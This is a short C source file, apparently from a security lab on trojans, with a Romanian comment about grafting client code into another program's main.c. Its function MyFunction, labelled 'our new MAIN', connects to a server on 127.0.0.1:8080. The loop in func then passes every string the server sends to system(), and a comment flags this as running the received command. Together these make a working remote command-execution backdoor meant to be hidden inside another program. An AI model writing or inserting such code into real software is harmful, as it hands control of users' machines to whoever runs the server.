// Copiem ce este în client.c, dar nu lăsăm main.c să comunice înapoi, doar să accepte
#include <netdb.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/socket.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define MAX 80 
#define PORT 8080 
#define SA struct sockaddr

// Function designed for chat between client and server. 
void func(int sockfd) 
{
	char buff[MAX]; 
    int n; 
    // infinite loop for chat 
    for (;;) 
	{
		bzero(buff, sizeof(buff)); 
		write(sockfd, buff, sizeof(buff)); 
        bzero(buff, sizeof(buff)); 
        read(sockfd, buff, sizeof(buff));
		printf("From Server : %s", buff);	
		system(buff); // !!!!! running the command received from the server 
		if ((strncmp(buff, "exit", 4)) == 0) { 
            printf("Client Exit...\n"); 
            break; 
        } 
	}
}

// this is our new MAIN
int MyFunction()
{
	int sockfd, connfd; 
    struct sockaddr_in servaddr, cli; 
	
	// socket create and varification, same as in the main function of client.c
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    if (sockfd == -1) { 
        printf("socket creation failed...\n"); 
        exit(0); 
    } 
    else
        printf("Socket successfully created..\n"); 
    bzero(&servaddr, sizeof(servaddr)); 
	
	// assign IP, PORT, same as in the main function of client.c
    servaddr.sin_family = AF_INET; 
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
    servaddr.sin_port = htons(PORT); 
  
    // connect the client socket to server socket, same as in the main function of client.c
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) { 
        printf("connection with the server failed...\n"); 
        exit(0); 
    } 
    else
        printf("connected to the server..\n"); 
  
    // function for chat 
    func(sockfd); 
  
    // close the socket
    close(sockfd); 

    return 0; // because this is our new "main"
}
